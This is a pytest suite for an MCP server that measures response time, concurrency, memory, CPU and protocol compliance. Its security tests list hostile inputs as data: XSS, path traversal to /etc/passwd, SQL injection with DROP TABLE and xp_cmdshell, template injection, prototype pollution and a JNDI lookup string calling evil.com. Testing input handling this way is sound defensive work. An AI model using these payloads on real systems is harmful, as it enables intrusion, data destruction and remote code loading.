"""
Enhanced Performance Testing Suite for Cross-Model MCP Server

This test suite provides comprehensive performance testing for the cross-model
consciousness MCP server, including response time, concurrent requests, memory
usage, and stress testing.
"""

import pytest
import time
import threading
import concurrent.futures
import psutil
import gc
import json
from unittest.mock import Mock, patch
from typing import Dict, List, Any

from run_mcp_cross_model import CrossModelMCPServer


class TestPerformanceSuite:
    """Performance testing suite for MCP server"""
    
    @pytest.fixture
    def server(self):
        """Create a test server with mocked dependencies"""
        with patch('cmc_service.MemoryStore'), \
             patch('cmc_service.cross_model_atom_creator.CrossModelAtomCreator'), \
             patch('cmc_service.cross_model_atom_storage.CrossModelAtomStorage'), \
             patch('apoe.model_selector.ModelSelector'), \
             patch('apoe.insight_extractor.InsightExtractor'), \
             patch('apoe.insight_transfer.InsightTransfer'), \
             patch('apoe.execution_orchestrator.ExecutionOrchestrator'), \
             patch('vif.cross_model_witness_generator.CrossModelWitnessGenerator'), \
             patch('vif.cross_model_confidence_calibrator.CrossModelConfidenceCalibrator'), \
             patch('vif.cross_model_replay.CrossModelReplay'):
            
            server = CrossModelMCPServer()
            return server
    
    def test_response_times(self, server):
        """Test all tools respond within 100ms"""
        tools_and_args = [
            ("select_models", {
                "task_description": "Test task",
                "context_size": 1000,
                "budget_limit": 0.05,
                "quality_requirement": "good"
            }),
            ("extract_insights", {
                "model_output": "Test output",
                "parsing_strategy": "structured"
            }),
            ("transfer_insights", {
                "insight_id": "test_insight",
                "target_model": "gpt-4o-mini"
            }),
            ("execute_task", {
                "task_id": "test_task",
                "execution_mode": "single_execution"
            }),
            ("generate_witness", {
                "operation_id": "test_operation",
                "operation_data": {}
            }),
            ("calibrate_confidence", {
                "model_predictions": [],
                "ground_truth": "test"
            }),
            ("replay_operation", {
                "operation_id": "test_operation"
            }),
            ("store_cross_model_atom", {
                "insight_data": {},
                "transfer_data": {},
                "execution_data": {}
            }),
            ("query_cross_model_atoms", {}),
            ("get_cross_model_stats", {})
        ]
        
        for tool_name, args in tools_and_args:
            start_time = time.time()
            response = getattr(server, tool_name)(1, args)
            response_time = (time.time() - start_time) * 1000  # Convert to milliseconds
            
            assert response_time < 100, f"{tool_name} took {response_time:.2f}ms (limit: 100ms)"
            assert response["jsonrpc"] == "2.0"
            assert response["id"] == 1
    
    def test_concurrent_requests(self, server):
        """Test 50+ concurrent requests"""
        def make_request():
            return server.select_models(1, {
                "task_description": "Concurrent test task",
                "context_size": 1000,
                "budget_limit": 0.05,
                "quality_requirement": "good"
            })
        
        # Test with 50 concurrent requests
        with concurrent.futures.ThreadPoolExecutor(max_workers=50) as executor:
            futures = [executor.submit(make_request) for _ in range(50)]
            results = [f.result() for f in futures]
        
        # All requests should complete successfully
        assert len(results) == 50
        assert all(r["jsonrpc"] == "2.0" for r in results)
        assert all(r["id"] == 1 for r in results)
    
    def test_memory_usage(self, server):
        """Test memory usage stays under 500MB"""
        process = psutil.Process()
        initial_memory = process.memory_info().rss / 1024 / 1024  # Convert to MB
        
        # Perform 100 operations
        for i in range(100):
            server.select_models(i + 1, {
                "task_description": f"Memory test task {i}",
                "context_size": 1000,
                "budget_limit": 0.05,
                "quality_requirement": "good"
            })
            # Force garbage collection every 10 operations
            if i % 10 == 0:
                gc.collect()
        
        final_memory = process.memory_info().rss / 1024 / 1024
        memory_growth = final_memory - initial_memory
        
        assert memory_growth < 500, f"Memory grew by {memory_growth:.2f}MB (limit: 500MB)"
    
    def test_high_load(self, server):
        """Test 1000+ requests per minute"""
        request_count = 0
        start_time = time.time()
        duration = 60  # 1 minute
        
        def make_requests():
            nonlocal request_count
            while time.time() - start_time < duration:
                try:
                    server.select_models(1, {
                        "task_description": "High load test",
                        "context_size": 1000,
                        "budget_limit": 0.05,
                        "quality_requirement": "good"
                    })
                    request_count += 1
                except Exception as e:
                    # Log error but continue
                    print(f"Request error: {e}")
        
        # Use 10 threads to simulate concurrent load
        threads = [threading.Thread(target=make_requests) for _ in range(10)]
        
        for thread in threads:
            thread.start()
        
        for thread in threads:
            thread.join()
        
        requests_per_minute = request_count / (duration / 60)
        assert requests_per_minute >= 1000, f"Only {requests_per_minute:.0f} requests/minute (target: 1000+)"
    
    def test_long_running_stability(self, server):
        """Test stability over extended period"""
        error_count = 0
        success_count = 0
        start_time = time.time()
        duration = 300  # 5 minutes
        
        while time.time() - start_time < duration:
            try:
                response = server.select_models(1, {
                    "task_description": "Long running test",
                    "context_size": 1000,
                    "budget_limit": 0.05,
                    "quality_requirement": "good"
                })
                
                if response["jsonrpc"] == "2.0":
                    success_count += 1
                else:
                    error_count += 1
                    
            except Exception as e:
                error_count += 1
                print(f"Error during long running test: {e}")
            
            time.sleep(1)  # 1 second between requests
        
        total_requests = success_count + error_count
        error_rate = error_count / total_requests if total_requests > 0 else 0
        
        assert error_rate < 0.01, f"Error rate too high: {error_rate:.2%} (limit: 1%)"
        assert success_count > 0, "No successful requests during long running test"
    
    def test_cpu_usage(self, server):
        """Test CPU usage stays under 50%"""
        process = psutil.Process()
        
        # Measure CPU usage during 100 operations
        cpu_percentages = []
        for i in range(100):
            cpu_percent = process.cpu_percent()
            if cpu_percent > 0:  # Only record non-zero values
                cpu_percentages.append(cpu_percent)
            
            server.select_models(i + 1, {
                "task_description": f"CPU test task {i}",
                "context_size": 1000,
                "budget_limit": 0.05,
                "quality_requirement": "good"
            })
        
        if cpu_percentages:
            avg_cpu = sum(cpu_percentages) / len(cpu_percentages)
            assert avg_cpu < 50, f"Average CPU usage too high: {avg_cpu:.2f}% (limit: 50%)"


class TestStressSuite:
    """Stress testing suite for MCP server"""
    
    @pytest.fixture
    def server(self):
        """Create a test server with mocked dependencies"""
        with patch('cmc_service.MemoryStore'), \
             patch('cmc_service.cross_model_atom_creator.CrossModelAtomCreator'), \
             patch('cmc_service.cross_model_atom_storage.CrossModelAtomStorage'), \
             patch('apoe.model_selector.ModelSelector'), \
             patch('apoe.insight_extractor.InsightExtractor'), \
             patch('apoe.insight_transfer.InsightTransfer'), \
             patch('apoe.execution_orchestrator.ExecutionOrchestrator'), \
             patch('vif.cross_model_witness_generator.CrossModelWitnessGenerator'), \
             patch('vif.cross_model_confidence_calibrator.CrossModelConfidenceCalibrator'), \
             patch('vif.cross_model_replay.CrossModelReplay'):
            
            server = CrossModelMCPServer()
            return server
    
    def test_memory_leaks(self, server):
        """Test for memory leaks over time"""
        process = psutil.Process()
        initial_memory = process.memory_info().rss / 1024 / 1024
        
        # Perform operations in cycles
        for cycle in range(10):
            for i in range(50):
                server.select_models(i + 1, {
                    "task_description": f"Memory leak test cycle {cycle} task {i}",
                    "context_size": 1000,
                    "budget_limit": 0.05,
                    "quality_requirement": "good"
                })
            
            # Force garbage collection after each cycle
            gc.collect()
            
            # Check memory growth
            current_memory = process.memory_info().rss / 1024 / 1024
            memory_growth = current_memory - initial_memory
            
            # Memory growth should be reasonable
            assert memory_growth < 100, f"Memory leak detected: {memory_growth:.2f}MB growth"
    
    def test_error_recovery(self, server):
        """Test error recovery and graceful degradation"""
        # Test with invalid inputs
        invalid_inputs = [
            {"task_description": "", "context_size": -1, "budget_limit": "invalid"},
            {"task_description": None, "context_size": None, "budget_limit": None},
            {"task_description": "x" * 10000, "context_size": 1000000, "budget_limit": 0.001},
        ]
        
        for invalid_input in invalid_inputs:
            try:
                response = server.select_models(1, invalid_input)
                # Should handle gracefully (either error or success)
                assert response["jsonrpc"] == "2.0"
                assert "result" in response or "error" in response
            except Exception as e:
                # Should not crash the server
                assert isinstance(e, Exception)
    
    def test_concurrent_error_handling(self, server):
        """Test error handling under concurrent load"""
        def make_request_with_error():
            try:
                # Intentionally cause errors
                response = server.select_models(1, {
                    "task_description": "",  # Empty description
                    "context_size": -1,      # Invalid size
                    "budget_limit": "invalid"  # Invalid budget
                })
                return response
            except Exception as e:
                return {"error": str(e)}
        
        # Make 100 concurrent requests with errors
        with concurrent.futures.ThreadPoolExecutor(max_workers=20) as executor:
            futures = [executor.submit(make_request_with_error) for _ in range(100)]
            results = [f.result() for f in futures]
        
        # All requests should complete without crashing
        assert len(results) == 100
        
        # Server should still be functional after errors
        normal_response = server.select_models(1, {
            "task_description": "Normal test after errors",
            "context_size": 1000,
            "budget_limit": 0.05,
            "quality_requirement": "good"
        })
        assert normal_response["jsonrpc"] == "2.0"


class TestSecuritySuite:
    """Security testing suite for MCP server"""
    
    @pytest.fixture
    def server(self):
        """Create a test server with mocked dependencies"""
        with patch('cmc_service.MemoryStore'), \
             patch('cmc_service.cross_model_atom_creator.CrossModelAtomCreator'), \
             patch('cmc_service.cross_model_atom_storage.CrossModelAtomStorage'), \
             patch('apoe.model_selector.ModelSelector'), \
             patch('apoe.insight_extractor.InsightExtractor'), \
             patch('apoe.insight_transfer.InsightTransfer'), \
             patch('apoe.execution_orchestrator.ExecutionOrchestrator'), \
             patch('vif.cross_model_witness_generator.CrossModelWitnessGenerator'), \
             patch('vif.cross_model_confidence_calibrator.CrossModelConfidenceCalibrator'), \
             patch('vif.cross_model_replay.CrossModelReplay'):
            
            server = CrossModelMCPServer()
            return server
    
    def test_input_validation(self, server):
        """Test input validation against malicious inputs"""
        malicious_inputs = [
            "<script>alert('xss')</script>",
            "../../../etc/passwd",
            "'; DROP TABLE users; --",
            "{{7*7}}",  # Template injection
            "\x00\x01\x02",  # Null bytes
            "javascript:alert('xss')",
            "<img src=x onerror=alert('xss')>",
            "'; EXEC xp_cmdshell('dir'); --",
            "${jndi:ldap://evil.com/a}",
            "{{config.items()}}"
        ]
        
        for malicious_input in malicious_inputs:
            try:
                response = server.select_models(1, {
                    "task_description": malicious_input,
                    "context_size": 1000,
                    "budget_limit": 0.05,
                    "quality_requirement": "good"
                })
                
                # Should handle gracefully without errors
                assert response["jsonrpc"] == "2.0"
                assert "result" in response or "error" in response
                
                # Should not contain the malicious input in response
                response_str = json.dumps(response)
                assert malicious_input not in response_str
                
            except Exception as e:
                # Should not crash the server
                assert isinstance(e, Exception)
    
    def test_large_input_handling(self, server):
        """Test handling of very large inputs"""
        # Test with very large task description
        large_input = "x" * 100000  # 100KB input
        
        response = server.select_models(1, {
            "task_description": large_input,
            "context_size": 1000,
            "budget_limit": 0.05,
            "quality_requirement": "good"
        })
        
        assert response["jsonrpc"] == "2.0"
        assert "result" in response or "error" in response
    
    def test_json_injection(self, server):
        """Test JSON injection prevention"""
        json_injection_inputs = [
            '{"malicious": "payload"}',
            '{"task_description": "test", "injected": "payload"}',
            '{"task_description": "test", "__proto__": {"malicious": true}}',
        ]
        
        for injection_input in json_injection_inputs:
            try:
                response = server.select_models(1, {
                    "task_description": injection_input,
                    "context_size": 1000,
                    "budget_limit": 0.05,
                    "quality_requirement": "good"
                })
                
                assert response["jsonrpc"] == "2.0"
                assert "result" in response or "error" in response
                
            except Exception as e:
                assert isinstance(e, Exception)


class TestIntegrationSuite:
    """Integration testing suite for MCP server"""
    
    @pytest.fixture
    def server(self):
        """Create a test server with mocked dependencies"""
        with patch('cmc_service.MemoryStore'), \
             patch('cmc_service.cross_model_atom_creator.CrossModelAtomCreator'), \
             patch('cmc_service.cross_model_atom_storage.CrossModelAtomStorage'), \
             patch('apoe.model_selector.ModelSelector'), \
             patch('apoe.insight_extractor.InsightExtractor'), \
             patch('apoe.insight_transfer.InsightTransfer'), \
             patch('apoe.execution_orchestrator.ExecutionOrchestrator'), \
             patch('vif.cross_model_witness_generator.CrossModelWitnessGenerator'), \
             patch('vif.cross_model_confidence_calibrator.CrossModelConfidenceCalibrator'), \
             patch('vif.cross_model_replay.CrossModelReplay'):
            
            server = CrossModelMCPServer()
            return server
    
    def test_mcp_protocol_compliance(self, server):
        """Test MCP protocol compliance"""
        # Test initialize request
        init_response = server.handle_initialize({
            "jsonrpc": "2.0",
            "id": 1,
            "method": "initialize",
            "params": {
                "protocolVersion": "2024-11-05",
                "capabilities": {},
                "clientInfo": {"name": "test-client", "version": "1.0.0"}
            }
        })
        
        assert init_response["jsonrpc"] == "2.0"
        assert init_response["id"] == 1
        assert "result" in init_response
        
        # Test tools/list request
        tools_response = server.handle_request({
            "jsonrpc": "2.0",
            "id": 2,
            "method": "tools/list",
            "params": {}
        })
        
        assert tools_response["jsonrpc"] == "2.0"
        assert tools_response["id"] == 2
        assert "result" in tools_response
        assert "tools" in tools_response["result"]
    
    def test_tool_discovery(self, server):
        """Test tool discovery and metadata"""
        tools_response = server.handle_request({
            "jsonrpc": "2.0",
            "id": 1,
            "method": "tools/list",
            "params": {}
        })
        
        tools = tools_response["result"]["tools"]
        
        # Should have all expected tools
        tool_names = [tool["name"] for tool in tools]
        expected_tools = [
            "select_models", "extract_insights", "transfer_insights",
            "execute_task", "generate_witness", "calibrate_confidence",
            "replay_operation", "store_cross_model_atom", "query_cross_model_atoms",
            "get_cross_model_stats", "store_memory", "get_memory_stats",
            "retrieve_memory", "create_plan", "track_confidence", "synthesize_knowledge"
        ]
        
        for expected_tool in expected_tools:
            assert expected_tool in tool_names, f"Missing tool: {expected_tool}"
        
        # Each tool should have proper metadata
        for tool in tools:
            assert "name" in tool
            assert "description" in tool
            assert "inputSchema" in tool
    
    def test_end_to_end_workflow(self, server):
        """Test complete end-to-end workflow"""
        # Step 1: Model selection
        model_response = server.select_models(1, {
            "task_description": "End-to-end test task",
            "context_size": 1000,
            "budget_limit": 0.05,
            "quality_requirement": "good"
        })
        assert model_response["jsonrpc"] == "2.0"
        
        # Step 2: Insight extraction
        insight_response = server.extract_insights(2, {
            "model_output": "Test output for end-to-end workflow",
            "parsing_strategy": "structured"
        })
        assert insight_response["jsonrpc"] == "2.0"
        
        # Step 3: Insight transfer
        transfer_response = server.transfer_insights(3, {
            "insight_id": "test_insight",
            "target_model": "gpt-4o-mini"
        })
        assert transfer_response["jsonrpc"] == "2.0"
        
        # Step 4: Task execution
        execution_response = server.execute_task(4, {
            "task_id": "test_task",
            "execution_mode": "single_execution"
        })
        assert execution_response["jsonrpc"] == "2.0"
        
        # Step 5: Store cross-model atom
        atom_response = server.store_cross_model_atom(5, {
            "insight_data": {},
            "transfer_data": {},
            "execution_data": {}
        })
        assert atom_response["jsonrpc"] == "2.0"


if __name__ == "__main__":
    # Run the performance tests
    pytest.main([__file__, "-v", "-s"])
